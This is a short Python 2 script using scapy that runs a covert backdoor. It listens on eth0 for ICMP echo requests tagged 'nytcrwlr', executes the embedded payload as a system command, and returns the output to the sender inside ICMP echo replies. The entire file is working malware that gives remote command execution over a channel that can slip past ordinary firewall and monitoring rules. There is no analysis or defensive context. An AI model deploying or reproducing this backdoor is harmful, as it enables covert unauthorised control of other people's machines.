#!/usr/bin/python

#server in indefinite loop sniffing for icmp request
#server gets icmp echo request with exact tag
#server calls processing fucntion and gets result
#server sends icmp response
#server keeps listening in loop again

try:
	from scapy.all import *
	import subprocess
	import sys
except Exception,e:
	print str(e)

def main():
	#make an infinite loop on listening function
	while 1:
		pkts = sniff(iface="eth0",timeout=10)
		for packet in pkts:
			if packet.haslayer(ICMP):
				if str(packet.getlayer(ICMP).type) == "8":
					try:
						command = packet.getlayer(Raw).load[0:]
					except Exception,e:
						continue
					identity = command[0:8].strip("\r").strip("\n")
					cmd = command[8:].strip("\r").strip("\n")
					if identity == "nytcrwlr":
						if cmd == "exit":
							sys.exit(0)
						else:
							cmd = cmd.split(" ")
							try:
								output = subprocess.check_output(cmd)
							except Exception,e:
								output = str(e)
								pass
							dest = str(packet.getlayer(IP).src)
							icmp = ICMP()
							ip = IP()
							icmp.type = 0
							icmp.code = 0
							ip.dst = dest
							data = output
							sr1(ip/icmp/data,timeout=1, verbose=False)

if __name__ == "__main__":
	main()
